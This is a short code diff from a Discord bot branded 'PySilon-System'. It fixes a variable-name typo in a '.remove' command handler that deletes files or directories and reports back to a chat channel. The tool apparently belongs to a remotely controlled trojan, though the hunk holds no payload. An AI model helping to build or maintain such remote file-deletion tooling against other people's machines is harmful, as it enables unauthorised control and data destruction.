@@ -31,7 +31,7 @@ elif message.content[:7] == '.remove':
                     embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                     embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
                     
-                    reaction_msg = await message.channel.send(embed=embeda); await reaction_msg.add_reaction('🔴')
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             else:
                 embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=0x8B0000)
                 embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
